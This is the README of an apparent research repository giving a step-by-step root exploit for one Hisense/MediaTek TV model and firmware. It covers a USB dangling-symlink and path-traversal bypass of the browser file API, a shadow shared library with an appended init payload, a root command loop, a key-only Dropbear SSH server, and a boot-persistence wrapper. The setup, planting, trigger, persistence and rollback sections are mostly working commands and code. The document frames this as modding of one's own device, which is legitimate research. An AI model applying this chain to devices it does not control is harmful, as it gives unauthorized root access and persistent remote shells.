# HE40E5600FFWTS / V0100.01.00A.N0410 — root, SSH and modding

**Status:** root and key-only SSH were recorded live on this exact model and
firmware; boot persistence is owner-verified (2026-11-04). The modding recipes
are **UNVERIFIED**. This is a separate chain from [the 50A51HUV / MTK9602 guide](../../50A51HUV/09.01O.P0813/README.md)
(the MTK9602 / 09.01 walkthrough) and must not be mixed with it.

> **Applies only to `HE40E5600FFWTS` running `V0100.01.00A.N0410`.**
> The loader index, the shadowed library name, the boot scripts and the
> writable paths are properties of this build. Another firmware, panel size or
> board revision is untested; nothing here is a generic VIDAA exploit.

## What this is

A no-flash software root path for one Hisense/MediaTek TV:

- the TV's own web browser (`hisense_browser`) already runs as **uid/gid 0**
  with full capabilities, single-process, no seccomp;
- a **dangling symlink on an ext4 USB stick** defeats the browser file API's
  `realpath` + prefix whitelist (`HSJSX_File::IsSubDentry`), so the API creates
  a root-owned file outside its intended directories;
- that file is a **shadow `libtvsysinfo.so`** placed at `LD_LIBRARY_PATH`
  index 17 (`/3rd_rw/loglevel/lib`), which the browser loads the next time it
  starts;
- the library carries an **appended `DT_INIT` payload** that unlinks itself,
  writes `/3rd_rw/root_proof.txt`, starts `/3rd_rw/appdata/root_loop.sh` as
  root and then calls the original init;
- a **static Dropbear 2022.83** key-only SSH server on port 22 follows, with an
  `/etc/passwd` bind mount and a devpts workaround for PTYs;
- a **`HamService` wrapper** starts the root loop and SSH on every boot.

Recorded live on 2026-10-26; the archive describes the installed boot
persistence and its reboot-test procedure. Survival across reboots is
owner-verified on 2026-11-04 (daily use, several reboots, root Dropbear still
live). See [EVIDENCE.md](EVIDENCE.md) for the exact split.

## What this is not

- **Not a flash, jailbreak or firmware modification.** No `.pkg`, no UART, no
  case opening, no bootloader work. `/` and `/3rd` stay read-only squashfs.
- **Not a vendor-binary distribution.** The payload is rebuilt from the
  original library on *your own* TV. This repository ships no vendor `.so`, no
  Dropbear binary, no host key and no private key.
- **Not tested on any other model or firmware.** The same board name with a
  different firmware is a different target.
- **Not a "root at cold boot" claim for the browser stage.** The shadow library
  runs when the browser starts, not at boot. Boot persistence of the root loop
  and SSH comes from the `HamService` wrapper.
- **Not "nothing is changed".** It creates files under `/3rd_rw`, adds runtime
  bind mounts over `/etc/passwd` and `/dev/pts`, and installs a boot wrapper.
  All of that is in writable space and has a teardown path, but it is a change.
- **Not fully reversible by the script alone.** `rollback.sh` removes the layers
  it installed; files you uploaded yourself into `/3rd_rw/appdata` and any
  backups you made are outside that list. See [Rollback](#rollback).

## At a glance

| | |
|---|---|
| Model | `HE40E5600FFWTS` |
| Firmware | `V0100.01.00A.N0410` |
| SoC | MediaTek **MT53xx / MT5863 class** (`mt53xx-emmc`, `mt5863_sa_768_linux`), ARMv7 Cortex-A53 (`part 0xd03`) |
| OS / userland | Linux **3.18.25** (32-bit ARM, SMP, PREEMPT), glibc **2.18**, BusyBox **1.18.5**, SysV init; **no package manager** |
| Result | root command channel (`uid=0`, `CapEff=0000003fffffffff`); key-only Dropbear SSH on TCP 22; PTY |
| Persistence | `HamService` wrapper installed in the 2026-10-26 record; **owner-verified** across reboots on 2026-11-04 |
| Last verified | 2026-11-04 (owner statement) / 2026-10-26 (recorded live chain) |

Storage layout (read-only root, writable data):

| Path | FS / mode | Notes |
|---|---|---|
| `/` | squashfs, **ro**, 38.8 MB | 100 % full; never written |
| `/3rd` | squashfs via `dm-3`, **ro**, 141 MB | 100 % full |
| `/3rd_rw` | ext4, **rw**, 1.1 GB | where the root/SSH files live |
| `/data` | ext4, **rw**, 1.9 GB | writable |
| `/perm` | ext4, **rw**, 3.9 MB | writable |
| `/spdata` | ext4, **ro** | read-only |
| `/dev` | part of the **ro** squashfs | no devtmpfs; static nodes |

No overlayfs. Modding is done with writable partitions plus `mount --bind`.

## Prerequisites

- The **exact** model and firmware. Confirm the firmware string in the TV's
  system information before you touch anything.
- A TV **you own**; a second, non-primary TV is the sane test target.
- A host on the same LAN with Python 3, and for the payload build
  `arm-linux-gnueabihf-{as,ld,objcopy}` (plus `gcc`, `make`, `bzip2` if you
  rebuild Dropbear). Optional: `qemu-arm` for host-side sanity checks.
- One USB stick you can wipe. It must be **ext4 with an MBR partition table**:
  FAT32 cannot hold symlinks, and a whole-disk ext4 ("superfloppy", no `sdX1`)
  is not mounted by the TV.
- Your own SSH key pair. The **private** key stays on your host; only the
  public key goes to the TV.
- The original `libtvsysinfo.so` from your own TV. It is **not** shipped here:
  copy `/3rd_rw/tvsysinfo/lib/libtvsysinfo.so` off your device into
  `tools/he40/root/artifacts/tvi_original.so` before building.
- Keep the root channel open until the very end. SSH/root-loop is the recovery
  path; a broken UI is recoverable, a closed channel is not.

> The recon server is unauthenticated by design and the browser it drives is
> root. Bind it to your LAN only, never to the internet, and close it when you
> are done.

## Chain at a glance

```
hisense_browser  (uid/gid 0, full CapEff, single process, no seccomp)
  │
  ├─ HiBrowser.File.download(url, "so/../../../../dev/shm/shm_tmp" + usb + "/tvi", 1)
  │     └─ tvi is a dangling ext4 symlink → /3rd_rw/loglevel/lib/libtvsysinfo.so
  │        realpath() fails on the missing target, the parent prefix passes
  │
  └─ next browser start
        └─ loader takes libtvsysinfo.so from LD_LIBRARY_PATH[17] = /3rd_rw/loglevel/lib
              └─ appended DT_INIT: unlink self
                 write /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
                 fork + exec /bin/sh /3rd_rw/appdata/root_loop.sh
                 call original DT_INIT, return to loader
                    └─ root loop: root_cmd.sh → root_out.txt
                         └─ deploy_sshd.sh
                              Dropbear 2022.83, 0.0.0.0:22, key-only
                              /etc/passwd bind (root home /3rd_rw/sshd/home)
                              devpts on /dev/shm/pts, bind over /dev/pts
                              /3rd_rw/hamservice/HamService wrapper
```

## Step by step

Commands assume the repository root as the working directory. Replace
`/dev/sdX` with your stick, `<dev>` with the TV's mount name (for example
`sda1`), `<host-ip>` and `<tv-ip>` with your addresses, and `<key>` with your
private key.

### 1. Prepare the USB stick (destructive)

```sh
sudo tools/he40/root/scripts/host/prepare_usb.sh /dev/sdX
```

The script wipes the device, writes an MBR partition table, formats
`/dev/sdX1` as ext4 with `^64bit,^metadata_csum` (label `TVSYM`), and creates:

```
tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (required, must stay dangling)
pwn -> /3rd_rw/root_proof.txt                 (optional proof target)
```

Manual equivalent:

```sh
sudo wipefs -a /dev/sdX
sudo parted -s /dev/sdX mklabel msdos mkpart primary ext4 1MiB 100%
sudo mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM /dev/sdX1
sudo mkdir -p /mnt/tvsym && sudo mount /dev/sdX1 /mnt/tvsym
sudo ln -sfn /3rd_rw/loglevel/lib/libtvsysinfo.so /mnt/tvsym/tvi
sudo ln -sfn /3rd_rw/root_proof.txt               /mnt/tvsym/pwn
sync && sudo umount /mnt/tvsym
```

`tvi` **must stay dangling**. That is the bypass: the file API's whitelist check
resolves the parent, and the missing target makes `realpath` fail in the
permissive direction.

### 2. Build your own payload

```sh
# 1) copy the original library from YOUR TV to:
#    tools/he40/root/artifacts/tvi_original.so
#    (source on the TV: /3rd_rw/tvsysinfo/lib/libtvsysinfo.so)
# 2) build:
tools/he40/root/scripts/host/build_payload.sh
```

Expected result: `tools/he40/root/tools/pub/libtvsysinfo.so`, **33,500 bytes**,
SHA-256 `37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a`,
from a 33,220-byte original. The builder appends the code, extends the RX
`PT_LOAD` `p_filesz/p_memsz`, and points `DT_INIT` at the appended cave.

Then copy the built payload where the recon server serves it:

```sh
cp tools/he40/root/tools/pub/libtvsysinfo.so tools/he40/recon/pub/
```

> **UNVERIFIED procedure detail:** the published tree has no scripted
> end-to-end extraction of the original library from the TV to the host. The
> record only shows the browser copying files between TV paths. The bundled
> recon server has a chunked `/dump` endpoint, which is one way to pull bytes
> off the device; that extraction step was not recorded as a single command.

### 3. Start the host server and open the recon page on the TV

```sh
tools/he40/root/scripts/host/start_http.sh          # binds 0.0.0.0:9000
```

On the TV, open the **TV browser** (not the system UI) at:

```
http://<host-ip>:9000/recon.html
```

The page exposes `listDir`, `fileXHR` and the `HiBrowser` bridge to the console
and posts results back to the server's `captures/` directory.

### 4. Find the mounted stick

In the page console:

```js
listDir("/mnt/usb")          // e.g. "[D] sda1"
listDir("/mnt/usb/sda1")     // must list "tvi"
```

### 5. Plant the shadow library

Paste `tools/he40/root/scripts/host/plant_payload.js` into the console after
setting `usb` to the value you just read. The core call is:

```js
var usb = "/mnt/usb/sda1";                 // adjust
var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
var r = HiBrowser.File.download("http://<host-ip>:9000/pub/libtvsysinfo.so",
                                target, 1);
r
```

Expect `r == 0` (`download=0`). The script also reads the planted file back to
`tvi_check_plant.so` (`back` should also be 0) so you can compare bytes. Check
the size and hash before going on; do not reboot on an unverified write.

### 6. Trigger the payload (browser start, not boot)

**Correction to older wording:** the shadow library is loaded when
`hisense_browser` **next starts**. The browser is *not* started at boot — it is
launched on demand when the TV browser tile is opened
(`modding/02-boot.md:177`). A reboot alone therefore does not execute the
payload.

Recorded procedure: reboot the TV, then **open the TV browser once**. That
start is what maps the shadow library and runs `DT_INIT`.

On the recon page, verify:

```js
fileXHR("file:///3rd_rw/root_proof.txt")          // ROOT_EXEC_TVI
fileXHR("file:///3rd_rw/appdata/root_loop.pid")   // a pid
listDir("/3rd_rw/loglevel/lib")                   // only liblogLevel.so (self-unlink)
```

If the proof is missing: check the size and hash of the planted file, confirm
the path, and restart the browser again.

### 7. Use the root command channel

```js
HiBrowser.File.write("root_cmd.sh",
  "/bin/busybox id\n" +
  "cat /proc/self/status | grep -E '^(Uid|Gid|CapEff):'\n", 1);
// wait ~2 s, then:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

Expected:

```
uid=0(root) gid=0(root)
Uid: 0 0 0 0
Gid: 0 0 0 0
CapEff: 0000003fffffffff
```

The bare `id` applet is not linked as `/bin/id` on this userland; use
`/bin/busybox id` (the same record uses `/bin/busybox uname -a`, `busybox tail`
and so on). If `busybox id` is also unavailable on your build (the record lists
`id` among the applets that were not built), read `Uid:`/`CapEff:` from
`/proc/self/status` — that is the authoritative part of the proof anyway.

`tools/he40/root/scripts/host/run_root_cmd.js` wraps the write/read cycle with
a timeout and posts the output to the recon server.

### 8. Deploy Dropbear and SSH

Upload the deploy files from the host server into `/3rd_rw/appdata` by pasting
`tools/he40/root/scripts/host/upload_to_appdata.js`:

```
dropbear dropbear-sftp dropbearkey sftp-server authorized_keys
start_sshd.sh root_loop.sh hamservice-wrapper.sh deploy_sshd.sh verify.sh rollback.sh
```

Put your **public** key at `tools/he40/recon/pub/authorized_keys` first; the
uploader fetches that filename from the server's `/pub/` directory. Only the
public key belongs there.

Expect every download to return `0`. Then run the installer through the root
loop (`run_root_cmd.js`, command pre-set):

```sh
/bin/sh /3rd_rw/appdata/deploy_sshd.sh
```

`deploy_sshd.sh` copies the binaries to `/3rd_rw/sshd`, creates an Ed25519 host
key if absent, builds `/3rd_rw/sshd/etc_passwd` with
`root:x:0:0:root:/3rd_rw/sshd/home:/bin/sh` and bind-mounts it over
`/etc/passwd`, mounts devpts on `/dev/shm/pts` and binds it over `/dev/pts`,
installs your public key as `0600` under a `0700` home, and starts Dropbear on
`0.0.0.0:22` with password auth compiled out. It then installs the
`HamService` wrapper.

Connect:

```sh
ssh -i <key> root@<tv-ip>
```

The record's host-key fingerprint is deliberately not published here. Confirm
it out of band: print the host public key on the TV with
`dropbearkey -y -f /3rd_rw/sshd/host_key`, pipe it through
`ssh-keygen -lf -`, and compare the result with what your client shows.

If the PTY fails, the workaround is already in `start_sshd.sh`; the manual form
is:

```sh
mkdir -p /dev/shm/pts
mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts
mount --bind /dev/shm/pts /dev/pts
```

`/dev/ptmx` (5,2) remains the static node. Reconnect; Dropbear does not need a
restart.

### 9. Boot persistence

`deploy_sshd.sh` replaces `/3rd_rw/hamservice/HamService` with a wrapper:

```sh
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/basic/bin
export PATH
/bin/sh /3rd_rw/appdata/root_loop.sh >/dev/null 2>&1 &
[ -x /3rd_rw/sshd/start_sshd.sh ] && /bin/sh /3rd_rw/sshd/start_sshd.sh >/dev/null 2>&1 &
exec /3rd/hamservice/HamService "$@"
```

`startHam.sh` is called from `delayrun.sh` after the late services start
(`/basic/autorun.sh` → `delayrun.sh`, ~15 s) and runs the wrapper as root; the
wrapper starts the loop and SSH, then executes the real service.

Reboot test:

```sh
ssh -i <key> root@<tv-ip> '/bin/busybox id; ps | grep -E "dropbear|root_loop"'
```

Owner report (2026-11-04): the TV is in daily use, has been rebooted several
times, and the root Dropbear is still live. The archived 2026-10-26 record only
contains the installation and this test procedure — not a post-reboot log. Both
statements are in [EVIDENCE.md](EVIDENCE.md).

### 10. Optional: SFTP — **UNVERIFIED on device**

Dropbear has no built-in `sftp-server`; the bundle builds a static OpenSSH
9.9p1 `sftp-server` and a Dropbear patched to
`SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`. `install_sftp.sh` uploads both,
starts a **test Dropbear on port 2222** (port 22 untouched), tests
`sftp -P 2222`, and only on success swaps the binary on port 22, keeping
`dropbear.nosftp` as backup.

```sh
tools/he40/root/scripts/host/install_sftp.sh
```

The host/build side is recorded (sizes, hashes, installer logic). A successful
SFTP session **on the TV is not recorded** — treat this as an optional add-on
to verify yourself.

## Verification: what actually proves success

| Check | Proves | Evidence class |
|---|---|---|
| `/3rd_rw/root_proof.txt` equals `ROOT_EXEC_TVI` | the appended `DT_INIT` ran as root | recorded live (2026-10-26) |
| `/3rd_rw/appdata/root_out.txt` shows `uid=0`, `CapEff=0000003fffffffff` | the root loop runs as root | recorded live |
| `/proc/net/tcp` shows `:0016` listening | Dropbear is up on port 22 | recorded live |
| `Pubkey auth succeeded for 'root'` in `/3rd_rw/sshd/dropbear.log` | key-only root login works | recorded live |
| `pts/0` session; `busybox script` → `uid=0(root)` | PTY works | recorded live |
| After a reboot, SSH and the root loop are running | boot persistence | **owner-verified 2026-11-04**; the 2026-10-26 record has the install + test procedure only |
| `sftp` on port 22 | optional SFTP | **not recorded** — built/staged only |

Everything in the first five rows is a **record claim** from the author's
research record, not an independent re-test by this repository. Rows six and
seven are explicitly weaker.

## Rollback

On the TV, as root:

```sh
/bin/sh /3rd_rw/appdata/rollback.sh
```

It stops the root loop and Dropbear, restores
`/3rd_rw/hamservice/HamService` as a symlink to `/3rd/hamservice/HamService`,
unmounts `/etc/passwd`, `/dev/pts` and `/dev/shm/pts`, and removes
`/3rd_rw/sshd` and the shadow library. Reboot afterwards.

Manual equivalent:

```sh
kill "$(cat /3rd_rw/appdata/root_loop.pid)" 2>/dev/null
kill "$(cat /3rd_rw/sshd/dropbear.pid)" 2>/dev/null
rm -f /3rd_rw/hamservice/HamService
ln -s /3rd/hamservice/HamService /3rd_rw/hamservice/HamService
umount /etc/passwd 2>/dev/null
umount /dev/pts 2>/dev/null
umount /dev/shm/pts 2>/dev/null
rm -rf /3rd_rw/sshd
rm -f /3rd_rw/loglevel/lib/libtvsysinfo.so
sync
reboot
```

The read-only rootfs and `/3rd` are never modified; the original library stays
at `/3rd_rw/tvsysinfo/lib`. A reboot without the start script also restores the
original `/etc/passwd` view.

**Not fully proven:** a byte-for-byte return to the pre-mod state. Files you
uploaded into `/3rd_rw/appdata` (the deploy scripts, payload copies, logs) and
any `/3rd_rw/backup` content are not all covered by `rollback.sh`; remove them
explicitly. SFTP rollback is separate: copy `dropbear.nosftp` back, kill the
daemon, re-run `start_sshd.sh`.

## Limits / not proven

- **Exact SoC designation and core count** (MT5863 vs the MT53xx family) and the
  **secure-boot/signature** status are UNVERIFIED.
- **U-Boot flow and environment** (`fw_printenv` reports a bad CRC and a default
  NFS environment), A/B slot selection and recovery are UNVERIFIED.
- **OTA machinery** (`checker.sh`, `ota_upgrade_strategy.sh`, `file_upgrading`,
  `bspatch`) is not part of this path and was not examined.
- **DRM / PlayReady / Widevine / Cobalt** are out of scope.
- **UI, launcher, AM and bloat recipes** are UNVERIFIED; they are derived from
  live/static files, not all executed. See [MODDING.md](MODDING.md).
- **SFTP on the device** is not recorded.
- **Browser engine version:** Chromium 59.0.3071.115 is the recorded browser
  generation; do not pin a V8 version. The records disagree and the V8 route was
  not used.
- **"26 preset tiles"** is a snapshot of the *reference device*, including the
  lab `VidaaRecon` app — not a stock retail list.
- **`id`/`uname` availability** is contradictory in the record (listed as not
  built, yet used in proof commands). Use `/bin/busybox …` or `/proc`.
- **The browser-at-boot wording** in older text is unsupported; see step 6.

## Tools

The published tool tree (scripts, pages and templates — no binaries, no keys):

| Path | Purpose |
|---|---|
| [tools/he40/](../../../../tools/he40/) | entry point for the HE40 tree |
| [root/scripts/host](../../../../tools/he40/root/scripts/host) | USB prep, host server, payload plant/upload/root-cmd, payload and Dropbear builds |
| [root/scripts/tv](../../../../tools/he40/root/scripts/tv) | `deploy_sshd.sh`, `root_loop.sh`, `start_sshd.sh`, wrapper, verify, rollback, SFTP staging |
| [root/tools/pub](../../../../tools/he40/root/tools/pub) | drop point for **your own** built binaries and public key |
| [root/artifacts](../../../../tools/he40/root/artifacts) | drop point for the original library from your TV |
| [recon](../../../../tools/he40/recon) | `recon.html`, `server.py`, payload directory, captures |
| [templates](../../../../tools/he40/templates) | `developer.sh`, app tile, hide list, custom UI, start script |
| [sources](../../../../tools/he40/sources) | expected upstream tarballs (not shipped) |

There is no prebuilt Dropbear, `sftp-server` or payload in this repository.
Build them, or use your own static ARM builds.

## Evidence and modding

- [EVIDENCE.md](EVIDENCE.md) — claim/status matrix, what was captured, what was
  only documented, sanitization and corrections.
- [MODDING.md](MODDING.md) — system layout, boot hooks, UI/launcher surface and
  the verified/unverified split.
- [the 50A51HUV / MTK9602 guide](../../50A51HUV/09.01O.P0813/README.md) — the *other*, unrelated chain
  (50A51HUV / MTK9602 / 09.01).
- [method inventory](../../../research/EXPLOITS.md) and
  [50A51HUV findings](../../50A51HUV/09.01O.P0813/FINDINGS.md) — method inventory and lab notebook.
- [inventory](../../../research/inventory.json) — the machine-readable row for
  this model.

## Attribution

Research and the original HE40 record: [@oOHiyoriOo](https://github.com/oOHiyoriOo).
Source: the author's vidaa research repository, commit `b893f1b` (a private
record, cited here rather than linked). This page is original English text
under the repository's MIT license — see [LICENSE](../../../../LICENSE) and
[SECURITY.md](../../../../SECURITY.md) for scope and disclosure.
